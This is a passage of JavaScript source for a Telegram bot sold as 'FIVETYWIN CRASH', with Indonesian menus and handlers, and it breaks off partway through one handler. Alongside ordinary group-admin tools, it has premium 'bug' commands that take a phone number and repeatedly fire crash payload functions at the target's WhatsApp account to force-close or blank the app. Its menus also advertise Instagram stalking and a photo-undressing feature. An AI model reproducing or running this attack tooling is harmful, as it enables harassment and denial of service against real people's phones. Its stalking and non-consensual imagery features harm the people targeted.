ᝰ. ɪǫᴄ ɪᴘʜᴏɴᴇ

╰┈➤ /ig
ᝰ. ᴅᴏᴡʟᴏᴀᴅ ᴠɪᴅɪᴏ ɪɢ

╰┈➤ /cekid
ᝰ. ᴄᴇᴋ ɪᴅ ᴜsᴇʀ

╰┈➤ /infome
ᝰ. ɪɴғᴏ ᴜsᴇʀ

╰┈➤ /stat
ᝰ. ᴄᴇᴋ ᴘᴇɴɢɢᴜɴᴀ ᴀᴋᴛɪғ

╰┈➤ /maps
ᝰ. ᴄᴇᴋ ᴍᴀᴘs ᴊᴀᴋᴀʀᴛᴀ ᴅʟʟ

╰┈➤ /duel
ᝰ. ᴅᴜᴇʟ ᴅᴇɴɢᴀɴ ᴜsᴇʀ

╰┈➤ /tiktok
ᝰ. ᴅᴏᴡʟᴏᴀᴅ ᴠɪᴅɪᴏ ᴛɪᴋᴛᴏᴋ ᴜʀʟ

 ʜᴀʟᴀᴍᴀɴ 2 / 5
</blockquote>
  `;
  newButtons = [
    [{ text: "𝐁𝐚𝐜𝐤", callback_data: "tools_tiga" }],
    [{ text: "𝐁𝐚𝐜𝐤 𝐌𝐞𝐧𝐮", callback_data: "tools_back" }], 
    [{ text: " 𝐑𝐨𝐨𝐦 𝐌𝐬𝐠 ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
  ];
    // === PAGE 2 → balik ke PAGE 1 ===
    } else if (data === "tools_tiga") {
      newCaption = `
<blockquote>
┏╼╼╼╼╼╼𝗖𝗢𝗢𝗠𝗔𝗡𝗗𝗦 𝗕𝗔𝗦𝗘╼╼╼┓

╰┈➤ /cuaca
ᝰ. ᴄᴇᴋ ᴄᴜᴀᴄᴀ ᴋᴏᴛᴀ

╰┈➤ /getcode
ᝰ. ɢᴇᴛ ᴄᴏᴅᴇ

╰┈➤ /uptime
ᝰ.  ᴄᴇᴋ ᴛɪᴍᴇ ᴜᴘ

╰┈➤ /play
ᝰ. ᴍᴇɴᴄᴀʀɪ ʟᴀɢᴜ ᴅᴀʀɪ sᴘᴏᴛɪғʏ

╰┈➤ /tagadmin
ᝰ. ᴛᴀɢ ᴀʟʟ ᴀᴅᴍɪɴ

╰┈➤ /admins
ᝰ. ᴄᴇᴋ ʙᴇʀᴀᴘᴀ ᴀᴅᴍɪɴ

╰┈➤ /restartbot
ᝰ. ᴍᴇʀᴇsᴛᴀʀᴛ ʙᴏᴛ

╰┈➤ /shortlink
ᝰ. ᴍᴇᴍᴘᴇʀ ᴘᴇɴᴅᴇᴋ ʟɪɴᴋ

╰┈➤ /fileinfo
ᝰ. ᴄᴇᴋ ɪɴғᴏ ғɪʟᴇ

⸙ ʜᴀʟᴀᴍᴀɴ 3 / 5
</blockquote>

      `;
      newButtons = [
        [{ text: "ɴᴇxᴛ", callback_data: "tools_empat" }],
        [{ text: "ʙᴀᴄᴋ", callback_data: "back_dua" }], 
        [{ text: " ʀᴏᴏᴍ ᴍsɢ (⌕) ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
      ];
      
        } else if (data === "back_tiga") {
      newCaption = `
<blockquote>
【 FIVETYWIN CRASH 𝙸𝚂 𝙷𝙴𝚁𝙴 】
╰┈➤ /cuaca
ᝰ. ᴄᴇᴋ ᴄᴜᴀᴄᴀ ᴋᴏᴛᴀ

╰┈➤ /getcode
ᝰ. ɢᴇᴛ ᴄᴏᴅᴇ

╰┈➤ /uptime
ᝰ.  ᴄᴇᴋ ᴛɪᴍᴇ ᴜᴘ

╰┈➤ /play
ᝰ. ᴍᴇɴᴄᴀʀɪ ʟᴀɢᴜ ᴅᴀʀɪ sᴘᴏᴛɪғʏ

╰┈➤ /tagadmin
ᝰ. ᴛᴀɢ ᴀʟʟ ᴀᴅᴍɪɴ

╰┈➤ /admins
ᝰ. ᴄᴇᴋ ʙᴇʀᴀᴘᴀ ᴀᴅᴍɪɴ

╰┈➤ /restartbot
ᝰ. ᴍᴇʀᴇsᴛᴀʀᴛ ʙᴏᴛ

╰┈➤ /shortlink
ᝰ. ᴍᴇᴍᴘᴇʀ ᴘᴇɴᴅᴇᴋ ʟɪɴᴋ

╰┈➤ /fileinfo
ᝰ. ᴄᴇᴋ ɪɴғᴏ ғɪʟᴇ

⸙ ʜᴀʟᴀᴍᴀɴ 3 / 5
</blockquote>

      `;
      newButtons = [
        [{ text: "ɴᴇxᴛ", callback_data: "tools_empat" }],
        [{ text: "ʙᴀᴄᴋ", callback_data: "back_dua" }], 
        [{ text: " ʀᴏᴏᴍ ᴍsɢ (⌕) ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
      ];
      
    // === PAGE 2 → balik ke PAGE 1 ===
    } else if (data === "tools_empat") {
      newCaption = `
<blockquote>
╰┈➤ /negarainfo
ᝰ. ᴄᴇᴋ ɪɴғᴏ ɴᴇɢᴀʀᴀ

╰┈➤ /sticker
ᝰ. ᴜʙᴀʜ ғᴏᴛᴏ ᴊᴀᴅɪ sᴛɪᴄᴋᴇʀ

╰┈➤ /beritaindo
ᝰ. ʙᴇʀɪᴛᴀ ɪɴᴅᴏ

╰┈➤ /logo
ᝰ. ᴍᴇᴍʙᴜᴀᴛ ʟᴏɢᴏ ᴅᴀʀɪ ᴛᴇxᴛ

╰┈➤ /pantun [ lucu,cinta,bijak ]
ᝰ. ᴊᴀʀᴊɪᴅ sɪɴɢ

╰┈➤ /trending
ᝰ. ᴍᴇʟɪʜᴀᴛ ɪɴғᴏ ʏᴀɴɢ ᴛʀᴇɴᴅ

╰┈➤ /katahariini
ᝰ. ᴋᴀᴛᴀ ᴋᴀᴛᴀ ʜᴀʀɪ ɪɴɪ

╰┈➤ /motivasi
ᝰ. ᴋᴀᴛᴀ ᴋᴀᴛᴀ ᴍᴏᴛɪᴠᴀsɪ

╰┈➤ /hariini
ᝰ. ᴄᴇᴋ ʜᴀʀɪ ɪɴɪ

⸙ ʜᴀʟᴀᴍᴀɴ 4 / 5
</blockquote>

      `;
      newButtons = [
        [{ text: "ɴᴇxᴛ", callback_data: "tools_lima" }],
        [{ text: "ʙᴀᴄᴋ", callback_data: "back_tiga" }], 
        [{ text: " ʀᴏᴏᴍ ᴍsɢ (⌕) ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
      ];
      
      
        } else if (data === "back_empat") {
      newCaption = `
<blockquote>
𝗧𝗢𝗢𝗟𝗦 𝗠𝗘𝗡𝗨 

╰┈➤ /negarainfo
ᝰ. ᴄᴇᴋ ɪɴғᴏ ɴᴇɢᴀʀᴀ

╰┈➤ /sticker
ᝰ. ᴜʙᴀʜ ғᴏᴛᴏ ᴊᴀᴅɪ sᴛɪᴄᴋᴇʀ

╰┈➤ /beritaindo
ᝰ. ʙᴇʀɪᴛᴀ ɪɴᴅᴏ

╰┈➤ /logo
ᝰ. ᴍᴇᴍʙᴜᴀᴛ ʟᴏɢᴏ ᴅᴀʀɪ ᴛᴇxᴛ

╰┈➤ /pantun [ lucu,cinta,bijak ]
ᝰ. ᴊᴀʀᴊɪᴅ sɪɴɢ

╰┈➤ /trending
ᝰ. ᴍᴇʟɪʜᴀᴛ ɪɴғᴏ ʏᴀɴɢ ᴛʀᴇɴᴅ

╰┈➤ /katahariini
ᝰ. ᴋᴀᴛᴀ ᴋᴀᴛᴀ ʜᴀʀɪ ɪɴɪ

╰┈➤ /motivasi
ᝰ. ᴋᴀᴛᴀ ᴋᴀᴛᴀ ᴍᴏᴛɪᴠᴀsɪ

╰┈➤ /hariini
ᝰ. ᴄᴇᴋ ʜᴀʀɪ ɪɴɪ

⸙ ʜᴀʟᴀᴍᴀɴ 4 / 5
</blockquote>

      `;
      newButtons = [
        [{ text: "ɴᴇxᴛ", callback_data: "tools_lima" }],
        [{ text: "ʙᴀᴄᴋ", callback_data: "back_tiga" }], 
        [{ text: " ʀᴏᴏᴍ ᴍsɢ (⌕) ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
      ];
      
      
     // === PAGE 2 → balik ke PAGE 1 ===
    } else if (data === "tools_lima") {
      newCaption = `
<blockquote>
【 FIVETYWIN CRASH 𝙸𝚂 𝙷𝙴𝚁𝙴 
╭━( ᴛᴏᴏʟs ᴍᴇɴᴜ )
╰┈➤ /faktaunik
ᝰ. ғᴀᴋᴛᴀ ᴜɴɪᴋ ᴅᴜɴɪᴀ

╰┈➤ /dunia
ᝰ. ʙᴇʀɪᴛᴀ ᴅᴜɴɪᴀ

╰┈➤ /gempa
ᝰ. ᴄᴇᴋ ɢᴇᴍᴘᴀ

╰┈➤ /chat
ᝰ. ᴄʜᴀᴛ ᴛᴏ ᴄʀᴇᴀᴛᴏʀ

╰┈➤ /ai
ᝰ. ʙᴇʀᴍᴀɪɴ ᴅᴇɴɢᴀɴ ᴀɪ

╰┈➤ /Instagramstalk
ᝰ. sᴛᴀʟᴋɪɴɢ ɪɴsᴛᴀɢʀᴀᴍ

╰┈➤ /song
ᝰ. ᴍᴇɴᴄᴀʀɪ sᴏɴɢ / ʟᴀɢᴜ

╰┈➤ /tonaked
ᝰ. ᴍᴇsᴜᴍ ʙᴊɪʀ

╰┈➤ /nfsw
ᝰ. sᴀɴɢᴇᴋ ɴɪʜ

⸙ ʜᴀʟᴀᴍᴀɴ 5 / 5
</blockquote>

      `;
      newButtons = [
        [{ text: "ʙᴀᴄᴋ", callback_data: "back_empat" }],
        [{ text: "ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", callback_data: "mainmenu" }], 
        [{ text: " ʀᴏᴏᴍ ᴍsɢ (⌕) ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
      ];
      
      
     // === PAGE 2 → balik ke PAGE 1 ===
    } else if (data === "tools_back") {
      newCaption = `
<blockquote>
【 FIVETYWIN CRASH 】

╰┈➤ /antilink [ on/of ] 
ᝰ. sᴇᴛᴛɪɴɢ ᴀɴᴛɪʟɪɴᴋ

╰┈➤ /groupinfo 
ᝰ. ᴄᴇᴋ ɪɴғᴏ ʜʀᴏᴜᴘ

╰┈➤ /setrules
ᝰ. sᴇᴛᴛɪɴɢ ʀᴜʟᴇs ɢʀᴏᴜᴘ

╰┈➤ /rules
ᝰ. ᴍᴇʟɪʜᴀᴛ ʀᴜʟᴇs ɢʀᴏᴜᴘ

╰┈➤ /mute
ᝰ. ᴍᴜᴛᴇ ᴜsᴇʀ

╰┈➤ /unmute
ᝰ. ᴜɴᴍᴜᴛᴇ ᴜsᴇʀ

╰┈➤ /ban
ᝰ. ʙᴀɴ ᴜsᴇʀ

╰┈➤ /unban
ᝰ. ᴜɴʙᴀɴ ᴜsᴇʀ

╰┈➤ /kick
ᝰ. ᴛᴇɴᴅᴀɴɢ ᴜsᴇʀ

⸙ ʜᴀʟᴀᴍᴀɴ 1 / 
</blockquote>

      `;
      newButtons = [
        [{ text: "ɴᴇxᴛ", callback_data: "tools_dua" }],
        [{ text: "ʙᴀᴄᴋ ⌦", callback_data: "mainmenu" }], 
        [{ text: " ʀᴏᴏᴍ ᴍsɢ (⌕) ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
      ];

    } else if (data === "thanksto") {
      newCaption = `
<blockquote>
FIVETYWIN CRASH
(⸙)ᴛʜᴀɴᴋs ғᴏʀ ᴀʟʟ ʙᴜʏʏᴇʀ sᴄʀɪᴘᴛ ᴄᴀᴜsᴇ ʏᴏᴜ FIVETYWIN CRASH ᴄᴀɴ sᴛᴀɴᴅ ᴛʜɪs ғᴀʀ ᴀɴᴅ ʙᴇ ᴀs ɢʀᴇᴀᴛ ᴀs ɪᴛ ʙʏ ᴀʟᴡᴀʏs ᴜsɪɴɢ FIVETYWIN CRASH ᴇᴠᴇɴ ᴛʜᴏᴜɢʜ ɪᴛ ɪs ɴᴏᴛ ᴀs ɢʀᴇᴀᴛ ᴀs ᴛʜᴇ ᴏᴛʜᴇʀs ✘
╭━『 ᴛʜᴀɴᴋs ғᴏʀ 』
ᝰ.ᐟ Allah Swt ( ᴍʏ ɢᴏᴏᴅ )
ᝰ.ᐟ My Family ( sᴜᴘᴘᴏʀᴛ )
ᝰ.ᐟ @FIVETYWIN ( ᴄʀᴇᴀᴛᴏʀ ) 
FIVETYWIN CRASH
</blockquote>
      `;
      newButtons = [
        [{ text: "ʙᴀᴄᴋ ⌦", callback_data: "mainmenu" }], 
        [{ text: " ʀᴏᴏᴍ ᴍsɢ (⌕) ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
      ];
      
      
    } else if (data === "bugshow2") {
  if (!isPremium) {
    return bot.answerCallbackQuery(callbackQuery.id, {
      text: "🚫 Fitur ini khusus untuk pengguna *PREMIUM*!\n\nHubungi @FIVETYWIN untuk upgrade ✨",
      show_alert: true // <-- ini bikin notif pop-up muncul di layar user
    });
  }

  newCaption = `
<blockquote>
╭▄︻デʙᴜɢ ᴏᴘᴛɪᴏɴ ═══━一<
ᝰ.ᐟ /XWaltion
  ╰⪼ Forclose 1 pesan v1
  
ᝰ.ᐟ /Xolxal
  ╰⪼ Forclose 1 pesan v2
  
ᝰ.ᐟ /Xenon
  ╰⪼ BLANK V1
  
</blockquote>
  `;
  newButtons = [
    [{ text: "ɴᴇxᴛ", callback_data: "bugshow" }],
    [{ text: "ʙᴀᴄᴋ", callback_data: "mainmenu" }], 
    [{ text: " ʀᴏᴏᴍ ᴍsɢ (⌕) ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
  ];


    } else if (data === "bugsohw3") {
  if (!isPremium) {
    return bot.answerCallbackQuery(callbackQuery.id, {
      text: "🚫 Fitur ini khusus untuk pengguna *PREMIUM*!\n\nHubungi @FIVETYWIN untuk upgrade ✨",
      show_alert: true // <-- ini bikin notif pop-up muncul di layar user
    });
  }

  newCaption = `
<blockquote>
FIVETYWIN CRASH
ᝰ.ᐟ /Xenon
  ╰⪼ BLANK V1
  
ᝰ.ᐟ /XAnomin
  ╰⪼ Forclose clik
  
ᝰ.ᐟ /Xixixi
  ╰⪼ FC + INVIS
 
ᝰ.ᐟ /XOlOW
  ╰⪼ Forclose Andro
  
</blockquote>
  `;
  newButtons = [
    [{ text: "ɴᴇxᴛ", callback_data: "bugshow" }],
    [{ text: "ʙᴀᴄᴋ", callback_data: "mainmenu" }], 
    [{ text: " ʀᴏᴏᴍ ᴍsɢ (⌕) ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
  ];

    } else if (data === "bugshow4") {
  if (!isPremium) {
    return bot.answerCallbackQuery(callbackQuery.id, {
      text: "🚫 Fitur ini khusus untuk pengguna *PREMIUM*!\n\nHubungi @FIVETYWIN untuk upgrade ✨",
      show_alert: true // <-- ini bikin notif pop-up muncul di layar user
    });
  }

  newCaption = `
<blockquote>
╭▄︻デʙᴜɢ ᴏᴘᴛɪᴏɴ ═══━一<
ᝰ.ᐟ /XWaltion
  ╰⪼ Forclose 1 pesan v1
  
ᝰ.ᐟ /Xolxal
  ╰⪼ Forclose 1 pesan v2
  
ᝰ.ᐟ /Xenon
  ╰⪼ BLANK V1
  
ᝰ.ᐟ /XAnomin
  ╰⪼ Forclose clik
  
ᝰ.ᐟ /Xixixi
  ╰⪼ FC + INVIS
 
ᝰ.ᐟ /XOlOW
  ╰⪼ Forclose Andro
  
ᝰ.ᐟ /Xkill
  ╰⪼ Forclose Andro
  
</blockquote>
  `;
  newButtons = [
    [{ text: "ɴᴇxᴛ", callback_data: "bugshow" }],
    [{ text: "ʙᴀᴄᴋ", callback_data: "mainmenu" }], 
    [{ text: " ʀᴏᴏᴍ ᴍsɢ (⌕) ", url: "https://t.me/MurbugSenonn" }]
  ];


    } else if (data === "doa_buyer") {
      newCaption = `
<blockquote>
【 FIVETYWIN CRASH
╭━━〔 𝗗𝗢𝗔 𝗗𝗔𝗥𝗜 FIVETYWIN  〕━━
Doa untuk pelanggan dalam Islam umumnya berfokus pada memohon kelancaran rezeki, berkah, dan agar pelanggan datang terus, seperti "Allahumma innii as-aluka rizqan halalan waasi'an thayyiban..." (Ya Allah, aku memohon rezeki yang halal, luas, baik) atau memohon agar Allah memperbaiki urusan dan memberikan pertolongan-Nya, serta diiringi dengan ikhtiar seperti pelayanan baik dan kualitas produk. Ada juga doa yang memohon agar pelanggan diberi petunjuk dan mendapatkan manfaat dari produk/layanan, serta doa khusus untuk diri sendiri agar amanah dan tidak membebani pelanggan. 

⸙ FIVETYWIN CRASH
</blockquote>
      `;
      newButtons = [
        [{ text: "ʙᴀᴄᴋ ⌦", callback_data: "mainmenu" }], 
        [{ text: " ʀᴏᴏᴍ ᴍsɢ (⌕) ", url: "t.me/FIVETYWIN" }]
      ];
      
      
    } else if (data === "mainmenu") {
      newCaption = `
<blockquote>
━━━【FIVETYWIN CRASH】━━━
─ (⚡) 𝗛𝗘𝗟𝗟𝗢 𝗚𝗨𝗬𝗦, 𝗧𝗛𝗔𝗡𝗞𝗦 𝗙𝗢𝗥 𝗠𝗔𝗞𝗜𝗡𝗚 𝗧𝗛𝗘 FIVETYWIN CRASH v1.0 𝗦𝗖𝗥𝗜𝗣𝗧. 𝗥𝗘𝗠𝗘𝗠𝗕𝗘𝗥 𝗡𝗢𝗧 𝗧𝗢 𝗨𝗦𝗘 𝗕𝗨𝗚𝗦 𝗜𝗡 𝗜𝗡𝗡𝗢𝗖𝗘𝗡𝗧 𝗣𝗘𝗢𝗣𝗟𝗘𝗚𝗨𝗬𝗦, 𝗢𝗡𝗟𝗬 𝗕𝗨𝗚 𝗚𝗨𝗜𝗟𝗧𝗬 𝗣𝗘𝗢𝗣𝗟𝗘. 𝗧𝗛𝗔𝗡𝗞𝗦 𝗙𝗢𝗥 𝗕𝗨𝗬𝗜𝗡𝗚 𝗜𝗧, 𝗛𝗢𝗣𝗘𝗙𝗨𝗟𝗟𝗬 𝗜𝗛𝗧 𝗛𝗘𝗟𝗣𝗦 👻
  
╭━━【 𝐏𝐇𝐀𝐓𝐎𝐌𝐈𝐗 𝐂𝐀𝐇𝐒𝐄𝐑 】━╼╼
┃ Developer : @FIVETYWIN
┃ Version : 1.0 VVIP
┃ Language : JavaScript
╰━━━━━━━━━━━━━━━━━╼╼━━━༉‧.  
╭━━━【 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 】━━━ 
┃ Username : ${username}  
┃ 𝐓𝐄𝐑𝐈𝐌𝐀𝐊𝐀𝐒𝐈𝐇 𝐓𝐄𝐋𝐀𝐇 𝐁𝐄𝐋𝐈 𝐒𝐂𝐑𝐏𝐈𝐓
╰━━━━━━━━━━━━╼╼━━╼╼━━━━༉‧. 

ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪ ʙᴀᴡᴀʜ
</blockquote> 
      `;
      newButtons = [
        [
          { text: "𝐒𝐮𝐩𝐩𝐨𝐫𝐭", callback_data: "thanksto" },
          { text: "𝐂𝐨𝐧𝐭𝐫𝐨𝐥 𝐌𝐞𝐧𝐮", callback_data: "ownermenu" }, 
        ], 
        [
          { text: "𝐁𝐮𝐠𝐬 𝐌𝐞𝐧𝐮 ", callback_data: "bugshow" }, 
        ], 
        [
          { text: "𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮 ", callback_data: "tools" },
        ], 
        [
          { text: "𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢𝐨𝐧 ", url: "t.me/FIVETYWIN" },
        ]
      ];
    } else {
      return bot.answerCallbackQuery(callbackQuery.id, { text: "Menu tidak dikenal", show_alert: false });
    }

    await bot.editMessageMedia({
      type: "photo",
      media: randomImage,
      caption: newCaption,
      parse_mode: "HTML"
    }, {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: { inline_keyboard: newButtons }
    });

    bot.answerCallbackQuery(callbackQuery.id);
  } catch (err) {
    console.error("Gagal edit media:", err);
    bot.answerCallbackQuery(callbackQuery.id, { text: "Error terjadi", show_alert: false });
  }
}); // <-- Penutup yang benar

/// --- ( Parameter ) --- \\\
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

/// --- ( Case Bug ) --- \\\
bot.onText(/\/XWaltion (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const fotobug = sendbug;
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (false) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH </blockquote>
ʟᴜ sɪᴀᴘᴀ ᴋᴏɴᴛᴏʟ ूाीू
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, fotobug, {
    caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : FORCLOSEV1
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : FORCLOSEV1
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 100; i++) {
      await stxcm(sock, target);
      await stxcm(sock, target);
      await stxcm(sock, target);
      await stxcm(sock, target);
      await sleep(1000);
    }

    console.log(chalk.red(`𖣂 FIVETYWIN CRASH ATTACK 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : FORCLOSEV1
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

bot.onText(/\/Xolxal (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const fotobug = sendbug;
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (false) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH </blockquote>
ʟᴜ sɪᴀᴘᴀ ᴋᴏɴᴛᴏʟ ूाीू
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, fotobug, {
    caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : FORCLOSEV2
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : FORCLOSEV2
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 100; i++) {
      await stxcm2(sock, target);
      await stxcm2(sock, target);
      await stxcm2(sock, target);
      await stxcm2(sock, target);
      await sleep(1000);
    }

    console.log(chalk.red(`𖣂 FIVETYWIN CRASH ATTACK 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : FORCLOSEV2
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});


bot.onText(/\/Xenon (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const fotobug = sendbug;
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (false) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH </blockquote>
ʟᴜ sɪᴀᴘᴀ ᴋᴏɴᴛᴏʟ ूाीू
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, fotobug, {
    caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : BLANKV1
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : BLANKV1
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 100; i++) {
      await XProtexBlankChatV3(target);
      await XProtexBlankChatV3(target);
      await XProtexBlankChatV3(target);
      await XProtexBlankChatV3(target);
      await sleep(1000);
    }

    console.log(chalk.red(`𖣂 FIVETYWIN CRASH ATTACK 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : BLANKV1
